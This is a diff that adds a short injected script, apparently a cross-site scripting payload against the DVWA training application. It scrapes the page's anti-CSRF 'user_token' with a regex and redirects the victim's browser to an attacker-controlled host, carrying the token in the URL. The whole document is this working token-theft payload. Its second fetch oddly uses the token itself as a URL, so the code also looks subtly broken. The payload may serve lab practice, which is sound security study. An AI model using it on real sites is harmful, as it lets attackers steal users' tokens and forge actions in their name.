@@ -1,0 +1,16 @@
+<script>
+    fetch("http://dvwa/guestbook/")
+        .then((r) => r.text())
+        .then((t) =>
+            fetch(t.match(/name=['"]user_token['"] value=['"]([^'"]+)['"]/)[1])
+                .then((r) => r.text())
+                .then(
+                    (t) =>
+                        (document.location =
+                            "http://attacker/csrf.html?token=" +
+                            t.match(
+                                /name=['"]user_token['"] value=['"]([^'"]+)['"]/,
+                            )[1]),
+                ),
+        );
+</script>
